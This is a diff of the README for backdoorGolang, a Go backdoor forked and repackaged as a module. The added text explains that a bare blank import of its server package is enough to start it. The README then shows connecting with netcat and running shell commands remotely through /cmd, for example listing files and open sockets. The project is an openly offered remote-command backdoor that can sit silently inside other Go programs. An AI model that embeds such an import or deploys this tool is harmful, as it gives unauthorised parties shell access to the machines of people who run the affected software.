@@ -8,6 +8,11 @@ _/!\ Work in progress, not a stable release /!\_
 
 ##Main goal
 
+Forked from pilebones/backdoorGolang.
+Changed from CLI interface to a golang module.
+User should just import the module:
+`import _ "github.com/guimagalhaes/backdoorGolang/core/socket/server"`
+
 A fork of my own project named : "pilebones/backdoorBash" (see: https://github.com/pilebones/backdoorBash) but instead of using Bash as programming language (Unix-like only) this new one will work on Windows too by using a Golang API (cross-plateform) developed from scratch (as much as possible).
 
 ## Requirements
@@ -28,39 +33,24 @@ From Debian :
 
 ```bash
 cd $GOPATH
-go get github.com/pilebones/backdoorGolang
-./bin/backdoorGolang --help
-
+go get github.com/guimagalhaes/backdoorGolang
 ```
 
-## Usage
 
-```bash
-./bin/backdoorGolang --help
-Usage of ./bin/backdoorGolang:
-  -d, --debug         Enable mode debug
-  -h, --host string   Set hostname to use (default "localhost")
-  -l, --listen        Enable listen mode (server socket mode)
-  -p, --port int      Set port number to use (default 9876)
-  -v, --verbose       Enable mode verbose
-  -V, --version       Display version number
-```
+## Client
 
-## Server-mode
-
-```bash
-./bin/backdoorGolang -h localhost -p 1234 -l
-```
-
-Notice : Server is multi-user capable (one server for X client)
-
-## Client-mode
-
-/!\ Not implemented yet, use netcat meanwhile !
+Use netcat
 
 ```bash
 netcat localhost 1234
 ```
+
+Then execute commands:
+/cmd ls -l
+/cmd ss -natp
+
+To exit:
+/quit
 
 ### Instructions
 
